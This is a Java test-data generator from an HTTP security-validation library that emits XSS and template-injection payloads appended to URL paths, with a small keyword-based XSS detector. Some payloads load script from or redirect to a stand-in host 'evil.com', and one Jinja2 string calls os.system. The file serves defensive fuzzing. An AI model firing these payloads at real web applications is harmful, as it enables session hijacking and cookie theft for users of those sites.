/*
 * Copyright © 2025 CUI-OpenSource-Software (info@cuioss.de)
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *     http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
package de.cuioss.tools.security.http.generators.injection;

import de.cuioss.test.generator.Generators;
import de.cuioss.test.generator.TypedGenerator;

/**
 * Generates XSS (Cross-Site Scripting) injection attack patterns for security testing.
 * 
 * <p>
 * This generator creates comprehensive XSS attack vectors designed to test the security
 * validation pipeline's ability to detect and prevent cross-site scripting attacks.
 * XSS attacks involve injecting malicious scripts into web applications that are then
 * executed in users' browsers, potentially leading to session hijacking, credential
 * theft, and other security vulnerabilities.
 * </p>
 * 
 * <h3>Attack Types Generated</h3>
 * <ul>
 *   <li>Reflected XSS - Script tags and HTML injection</li>
 *   <li>Stored XSS - Persistent script injection patterns</li>
 *   <li>DOM-based XSS - Client-side script manipulation</li>
 *   <li>JavaScript Protocol Injection - javascript: URLs</li>
 *   <li>Event Handler Injection - onload, onclick, onerror handlers</li>
 *   <li>HTML Attribute Injection - Breaking out of attributes</li>
 *   <li>CSS Expression Injection - CSS-based script execution</li>
 *   <li>SVG-based XSS - Vector graphics script injection</li>
 *   <li>Data URI XSS - Base64 encoded script injection</li>
 *   <li>Filter Bypass Techniques - Encoding and obfuscation</li>
 *   <li>Context-specific Injection - JSON, XML, CSS contexts</li>
 *   <li>Polyglot Payloads - Multi-context attack vectors</li>
 *   <li>Mutation XSS - Browser parsing inconsistencies</li>
 *   <li>Template Injection - Server-side template attacks</li>
 * </ul>
 * 
 * <h3>Security Standards</h3>
 * <ul>
 *   <li>OWASP Top 10 - A03:2021 Injection</li>
 *   <li>CWE-79: Improper Neutralization of Input During Web Page Generation</li>
 *   <li>CWE-83: Improper Neutralization of Script in Attributes</li>
 *   <li>CWE-87: Improper Neutralization of Alternate XSS Syntax</li>
 *   <li>CWE-116: Improper Encoding or Escaping of Output</li>
 *   <li>CWE-692: Incomplete Blacklist to Cross-Site Scripting</li>
 *   <li>NIST SP 800-53 - SI-10 Information Input Validation</li>
 *   <li>HTML5 Security Guidelines</li>
 *   <li>Content Security Policy (CSP) Standards</li>
 * </ul>
 * 
 * Implements: Generator for Task T11 from HTTP verification specification
 * 
 * @author Claude Code Generator
 * @since 2.5
 */
public class XssInjectionAttackGenerator implements TypedGenerator<String> {

    // Core generation parameters
    private final TypedGenerator<String> pathCategories = Generators.fixedValues("/admin", "/user", "/api", "/config");
    private final TypedGenerator<String> functionCategories = Generators.fixedValues("search", "login", "upload", "comments");
    private final TypedGenerator<String> traversalCategories = Generators.fixedValues("../", "../../", "/etc", "/proc");
    private final TypedGenerator<String> systemCategories = Generators.fixedValues("passwd", "environ", "shadow", "config");
    private final TypedGenerator<String> attackCategories = Generators.fixedValues("script", "event", "protocol", "attribute");
    private final TypedGenerator<String> technicalCategories = Generators.fixedValues("css", "svg", "uri", "bypass");
    private final TypedGenerator<String> contextCategories = Generators.fixedValues("polyglot", "mutation", "template", "dom");
    private final TypedGenerator<Boolean> contextSelector = Generators.booleans();
    private final TypedGenerator<Integer> stringSize = Generators.integers(3, 10);
    private final TypedGenerator<Integer> attackTypeSelector = Generators.integers(0, 13);

    @Override
    public String next() {
        String basePattern = generateBasePattern();
        int attackType = attackTypeSelector.next();

        return switch (attackType) {
            case 0 -> createBasicScriptTagAttack(basePattern);
            case 1 -> createEventHandlerInjection(basePattern);
            case 2 -> createJavaScriptProtocolAttack(basePattern);
            case 3 -> createHtmlAttributeInjection(basePattern);
            case 4 -> createCssExpressionInjection(basePattern);
            case 5 -> createSvgXssInjection(basePattern);
            case 6 -> createDataUriInjection(basePattern);
            case 7 -> createFilterBypassTechniques(basePattern);
            case 8 -> createContextSpecificInjection(basePattern);
            case 9 -> createPolyglotPayload(basePattern);
            case 10 -> createMutationXss(basePattern);
            case 11 -> createTemplateInjection(basePattern);
            case 12 -> createDomBasedXss(basePattern);
            case 13 -> createStoredXssPatterns(basePattern);
            default -> createBasicScriptTagAttack(basePattern);
        };
    }

    /**
     * Create basic script tag injection attacks.
     */
    private String createBasicScriptTagAttack(String pattern) {
        String[] scriptTags = {
                "<script>alert('XSS')</script>",
                "<script>alert(document.cookie)</script>",
                "<script>alert(String.fromCharCode(88,83,83))</script>",
                "<script>window.location='http://evil.com'</script>",
                "<script>document.write('<img src=x onerror=alert(1)>')</script>",
                "<script src=//evil.com/xss.js></script>",
                "<script>eval(atob('YWxlcnQoJ1hTUycpOw=='))</script>", // Base64: alert('XSS');
                "</script><script>alert('XSS')</script><script>"
        };

        String scriptTag = scriptTags[Math.abs(pattern.hashCode()) % scriptTags.length];
        return pattern + "?q=" + scriptTag;
    }

    /**
     * Create event handler injection attacks.
     */
    private String createEventHandlerInjection(String pattern) {
        String[] eventHandlers = {
                "<img src=x onerror=alert('XSS')>",
                "<body onload=alert('XSS')>",
                "<div onclick=alert('XSS')>",
                "<svg onload=alert('XSS')>",
                "<iframe onload=alert('XSS')>",
                "<input onfocus=alert('XSS') autofocus>",
                "<select onfocus=alert('XSS') autofocus><option>",
                "<textarea onfocus=alert('XSS') autofocus>",
                "<button onclick=alert('XSS')>Click</button>",
                "<form onsubmit=alert('XSS')>",
                "<audio onloadstart=alert('XSS')>",
                "<video onloadstart=alert('XSS')>"
        };

        String handler = eventHandlers[Math.abs(pattern.hashCode()) % eventHandlers.length];
        return pattern + "?data=" + handler;
    }

    /**
     * Create JavaScript protocol injection attacks.
     */
    private String createJavaScriptProtocolAttack(String pattern) {
        String[] jsProtocols = {
                "javascript:alert('XSS')",
                "javascript:alert(document.cookie)",
                "javascript:window.location='http://evil.com'",
                "javascript:eval(String.fromCharCode(97,108,101,114,116,40,49,41))", // alert(1)
                "javascript:void(0);alert('XSS')",
                "javascript:/**/alert('XSS')",
                "javascript:&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;", // HTML entities
                "javascript:alert`XSS`", // Template literals
                "JaVaScRiPt:alert('XSS')", // Case variation
                "java\u0000script:alert('XSS')" // Null byte
        };

        String jsProtocol = jsProtocols[Math.abs(pattern.hashCode()) % jsProtocols.length];
        return pattern + "?redirect=" + jsProtocol;
    }

    /**
     * Create HTML attribute injection attacks.
     */
    private String createHtmlAttributeInjection(String pattern) {
        String[] attributeInjections = {
                "' onload='alert(`XSS`)' '",
                "\" onmouseover=\"alert('XSS')\" \"",
                "' onclick='alert(String.fromCharCode(88,83,83))' '",
                "\" onerror=\"alert('XSS')\" \"",
                "'><script>alert('XSS')</script><'",
                "\"><script>alert('XSS')</script><\"",
                "' autofocus onfocus='alert(`XSS`)' '",
                "\" style=\"background:url(javascript:alert('XSS'))\" \"",
                "'></img><svg onload=alert('XSS')><'",
                "\"></iframe><img src=x onerror=alert('XSS')><\""
        };

        String injection = attributeInjections[Math.abs(pattern.hashCode()) % attributeInjections.length];
        return pattern + "?value=" + injection;
    }

    /**
     * Create CSS expression injection attacks.
     */
    private String createCssExpressionInjection(String pattern) {
        String[] cssExpressions = {
                "background:url(javascript:alert('XSS'))",
                "background:expression(alert('XSS'))",
                "background-image:url(javascript:alert('XSS'))",
                "list-style-image:url(javascript:alert('XSS'))",
                "@import 'javascript:alert(\"XSS\")'",
                "behavior:url(xss.htc)",
                "content:url(javascript:alert('XSS'))",
                "-webkit-binding:url(javascript:alert('XSS'))",
                "-moz-binding:url(javascript:alert('XSS'))",
                "filter:progid:DXImageTransform.Microsoft.AlphaImageLoader(src=javascript:alert('XSS'))"
        };

        String cssExpr = cssExpressions[Math.abs(pattern.hashCode()) % cssExpressions.length];
        return pattern + "?style=" + cssExpr;
    }

    /**
     * Create SVG-based XSS injection attacks.
     */
    private String createSvgXssInjection(String pattern) {
        String[] svgPayloads = {
                "<svg onload=alert('XSS')>",
                "<svg><script>alert('XSS')</script></svg>",
                "<svg><animate onbegin=alert('XSS')>",
                "<svg><foreignObject><script>alert('XSS')</script></foreignObject></svg>",
                "<svg><use href=\"javascript:alert('XSS')\">",
                "<svg><image href=\"javascript:alert('XSS')\">",
                "<svg xmlns=\"http://www.w3.org/2000/svg\" onload=\"alert('XSS')\">",
                "<svg><set attributeName=onload to=alert('XSS')>",
                "<svg><desc><script>alert('XSS')</script></desc></svg>",
                "<svg width=\"100\" height=\"100\"><circle cx=\"50\" cy=\"50\" r=\"40\" onload=\"alert('XSS')\"/></svg>"
        };

        String svgPayload = svgPayloads[Math.abs(pattern.hashCode()) % svgPayloads.length];
        return pattern + "?content=" + svgPayload;
    }

    /**
     * Create data URI injection attacks.
     */
    private String createDataUriInjection(String pattern) {
        String[] dataUris = {
                "data:text/html,<script>alert('XSS')</script>",
                "data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=", // <script>alert('XSS')</script>
                "data:text/javascript,alert('XSS')",
                "data:application/javascript,alert('XSS')",
                "data:text/html,<iframe src=javascript:alert('XSS')>",
                "data:image/svg+xml,<svg onload=alert('XSS')>",
                "data:text/html;charset=utf-8,<script>alert('XSS')</script>",
                "data:text/html,%3Cscript%3Ealert('XSS')%3C/script%3E",
                "data:,<script>alert('XSS')</script>",
                "data:text/vbscript,MsgBox\"XSS\""
        };

        String dataUri = dataUris[Math.abs(pattern.hashCode()) % dataUris.length];
        return pattern + "?url=" + dataUri;
    }

    /**
     * Create filter bypass techniques using encoding and obfuscation.
     */
    private String createFilterBypassTechniques(String pattern) {
        String[] bypassTechniques = {
                // HTML entity encoding
                "&#60;script&#62;alert(&#39;XSS&#39;)&#60;/script&#62;",
                "&lt;script&gt;alert(&apos;XSS&apos;)&lt;/script&gt;",

                // Hex encoding
                "&#x3C;script&#x3E;alert(&#x27;XSS&#x27;)&#x3C;/script&#x3E;",

                // Unicode encoding
                "\\u003cscript\\u003ealert('XSS')\\u003c/script\\u003e",

                // Mixed case
                "<ScRiPt>alert('XSS')</ScRiPt>",

                // Null bytes
                "<script\u0000>alert('XSS')</script>",

                // Comments and whitespace
                "<script>/**/alert('XSS')/**/<//script>",
                "<script\t>alert('XSS')</script>",
                "<script\n>alert('XSS')</script>",

                // Alternative syntax
                "<script>alert`XSS`</script>",
                "<script>alert('X'+'SS')</script>",
                "<script>window['alert']('XSS')</script>",

                // Nested tags
                "<<script>script>alert('XSS')</</script>script>",

                // Incomplete tags
                "<scri<script>pt>alert('XSS')</scri</script>pt>"
        };

        String bypass = bypassTechniques[Math.abs(pattern.hashCode()) % bypassTechniques.length];
        return pattern + "?input=" + bypass;
    }

    /**
     * Create context-specific injection attacks for JSON, XML, etc.
     */
    private String createContextSpecificInjection(String pattern) {
        String[] contextInjections = {
                // JSON context
                "\"}; alert('XSS'); var x={\"",
                "'; alert('XSS'); var x='",
                "\\\"}; alert('XSS'); {\\\"",

                // XML context
                "]]></value><script>alert('XSS')</script><value><![CDATA[",
                "\" onload=\"alert('XSS')\" \"",
                "'--><script>alert('XSS')</script><!--",

                // CSS context
                "'; alert('XSS'); /*",
                "*/ alert('XSS'); /*",
                "} alert('XSS'); {",

                // SQL context (in URLs)
                "'; alert('XSS'); --",
                "') OR 1=1; alert('XSS'); --",

                // URL context
                "?</script><script>alert('XSS')</script>",
                "#</script><script>alert('XSS')</script>",

                // Email context
                "test@evil.com<script>alert('XSS')</script>"
        };

        String injection = contextInjections[Math.abs(pattern.hashCode()) % contextInjections.length];
        return pattern + "?context=" + injection;
    }

    /**
     * Create polyglot payloads that work in multiple contexts.
     */
    private String createPolyglotPayload(String pattern) {
        String[] polyglots = {
                "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e",
                "'\"--></script></title></textarea></style></template></noembed></noscript></iframe></noframes></plaintext></xmp><svg onload=alert()>",
                "';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//--></SCRIPT>\">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>",
                "\"'><img src=x onerror=alert('XSS')>//",
                "</script><svg onload=alert('XSS')>",
                "';alert('XSS');var a='",
                "\";alert('XSS');var a=\"",
                "*/alert('XSS');//",
                "<!--<script>alert('XSS')</script>-->",
                "{alert('XSS')}"
        };

        String polyglot = polyglots[Math.abs(pattern.hashCode()) % polyglots.length];
        return pattern + "?payload=" + polyglot;
    }

    /**
     * Create mutation XSS attacks that exploit browser parsing differences.
     */
    private String createMutationXss(String pattern) {
        String[] mutations = {
                // Mislabeled elements
                "<form><button formaction=\"javascript:alert('XSS')\">",
                "<table><input name=\"test\" formaction=\"javascript:alert('XSS')\">",

                // Nested forms
                "<form><form><button formaction=\"javascript:alert('XSS')\">",

                // Invalid nesting that browsers fix
                "<b><p><b><p><b><p><img src=x onerror=alert('XSS')>",

                // Template elements
                "<template><script>alert('XSS')</script></template>",

                // Missing closing tags
                "<div><script>alert('XSS')",

                // Malformed attributes
                "<img src\"=x onerror=alert('XSS')>",
                "<img src'=x onerror=alert('XSS')>",

                // Special characters
                "<img src=`x` onerror=`alert('XSS')` >",

                // Mutation through innerHTML
                "<image src=x onerror=alert('XSS')>", // Becomes <img>
                
                // Parser confusion
                "<svg><![CDATA[<script>alert('XSS')</script>]]></svg>"
        };

        String mutation = mutations[Math.abs(pattern.hashCode()) % mutations.length];
        return pattern + "?html=" + mutation;
    }

    /**
     * Create template injection attacks for server-side templates.
     */
    private String createTemplateInjection(String pattern) {
        String[] templateInjections = {
                // Angular.js
                "{{constructor.constructor('alert(\"XSS\")')()}}",
                "{{$on.constructor('alert(\"XSS\")')()}}",
                "{{[].constructor.constructor('alert(\"XSS\")')()}}",

                // React JSX
                "{alert('XSS')}",
                "<script>{alert('XSS')}</script>",

                // Vue.js
                "{{$eval.constructor('alert(\"XSS\")')()}}",

                // Handlebars
                "{{#with \"constructor\"}}{{#with ../constructor}}{{../constructor.constructor(\"alert('XSS')\")()}}{{/with}}{{/with}}",

                // Mustache
                "{{#lambda}}alert('XSS'){{/lambda}}",

                // Twig
                "{{_self.env.setCache(\"ftp://evil.com:2121\")}}",
                "{{_self.env.loadTemplate(\"string:alert('XSS')\").render()}}",

                // Jinja2
                "{{config.__class__.__init__.__globals__['os'].system('alert XSS')}}",

                // Generic
                "${alert('XSS')}",
                "#{alert('XSS')}"
        };

        String injection = templateInjections[Math.abs(pattern.hashCode()) % templateInjections.length];
        return pattern + "?template=" + injection;
    }

    /**
     * Create DOM-based XSS attacks that exploit client-side vulnerabilities.
     */
    private String createDomBasedXss(String pattern) {
        String[] domPayloads = {
                // URL fragment exploitation
                "#<script>alert('XSS')</script>",
                "#<img src=x onerror=alert('XSS')>",

                // Hash-based
                "#javascript:alert('XSS')",

                // PostMessage exploitation
                "?msg=<script>alert('XSS')</script>",

                // LocalStorage/SessionStorage
                "?data=<script>localStorage.setItem('xss','<script>alert(1)</script>');alert('XSS')</script>",

                // Document.location manipulation
                "?redirect=javascript:alert('XSS')",

                // innerHTML sinks
                "?content=<img src=x onerror=alert('XSS')>",

                // jQuery selectors
                "?selector=#<script>alert('XSS')</script>",

                // Angular routing
                "?route=javascript:alert('XSS')",

                // WebSocket messages
                "?ws=<script>alert('XSS')</script>"
        };

        String domPayload = domPayloads[Math.abs(pattern.hashCode()) % domPayloads.length];
        return pattern + domPayload;
    }

    /**
     * Create stored XSS patterns for persistent injection.
     */
    private String createStoredXssPatterns(String pattern) {
        String[] storedPatterns = {
                // Username/Profile fields
                "<script>alert('Stored XSS in Profile')</script>",
                "<img src=x onerror=alert('Stored XSS')>",

                // Comment systems
                "Great post! <script>alert('XSS in Comments')</script>",

                // File uploads
                "filename.jpg<script>alert('XSS')</script>",
                "<?xml version=\"1.0\"?><script>alert('XSS')</script>",

                // Email fields
                "user@domain.com<script>alert('XSS')</script>",

                // Search terms
                "search<script>alert('Stored XSS')</script>",

                // Form data
                "data<svg onload=alert('Stored XSS')>",

                // URL parameters that get stored
                "param=<script>setTimeout(function(){alert('Delayed XSS')},1000)</script>",

                // JSON data storage
                "{\"data\":\"<script>alert('JSON XSS')</script>\"}",

                // Database injection leading to XSS
                "'; INSERT INTO comments VALUES ('<script>alert(\"SQL to XSS\")</script>'); --"
        };

        String stored = storedPatterns[Math.abs(pattern.hashCode()) % storedPatterns.length];
        return pattern + "?data=" + stored;
    }

    /**
     * Check if a string contains XSS attack patterns.
     */
    public boolean containsXssPatterns(String input) {
        if (input == null) {
            return false;
        }

        String lowercaseInput = input.toLowerCase();

        // Check for script tags
        if (lowercaseInput.contains("<script") || lowercaseInput.contains("</script>")) {
            return true;
        }

        // Check for javascript protocol
        if (lowercaseInput.contains("javascript:")) {
            return true;
        }

        // Check for event handlers
        String[] eventHandlers = {"onload", "onclick", "onerror", "onmouseover", "onfocus", "onsubmit"};
        for (String handler : eventHandlers) {
            if (lowercaseInput.contains(handler + "=")) {
                return true;
            }
        }

        // Check for data URIs with scripts
        if (lowercaseInput.contains("data:text/html") && lowercaseInput.contains("script")) {
            return true;
        }

        // Check for SVG XSS
        if (lowercaseInput.contains("<svg") && (lowercaseInput.contains("onload") || lowercaseInput.contains("script"))) {
            return true;
        }

        return false;
    }

    private String generateBasePattern() {
        int patternType = Generators.integers(0, 4).next();
        return switch (patternType) {
            case 0 -> generatePathPattern();
            case 1 -> generateFunctionPattern();
            case 2 -> generateTraversalPattern();
            case 3 -> generateSystemPattern();
            case 4 -> generateCustomPattern();
            default -> generatePathPattern();
        };
    }

    private String generatePathPattern() {
        String basePath = pathCategories.next();
        if (contextSelector.next()) {
            String function = functionCategories.next();
            return basePath + "/" + function;
        }
        return basePath;
    }

    private String generateFunctionPattern() {
        String function = functionCategories.next();
        if (contextSelector.next()) {
            String path = pathCategories.next();
            return path + "/" + function;
        }
        return "/" + function;
    }

    private String generateTraversalPattern() {
        String traversal = traversalCategories.next();
        if (contextSelector.next()) {
            String system = systemCategories.next();
            return traversal + system;
        }
        return traversal;
    }

    private String generateSystemPattern() {
        String system = systemCategories.next();
        String prefix = contextSelector.next() ? "/etc/" : "/proc/self/";
        return prefix + system;
    }

    private String generateCustomPattern() {
        String category = Generators.fixedValues("dashboard", "settings", "profile").next();
        String suffix = contextSelector.next() ? "/" + Generators.letterStrings(3, 8).next() : "";
        return "/" + category + suffix;
    }

    @Override
    public Class<String> getType() {
        return String.class;
    }
}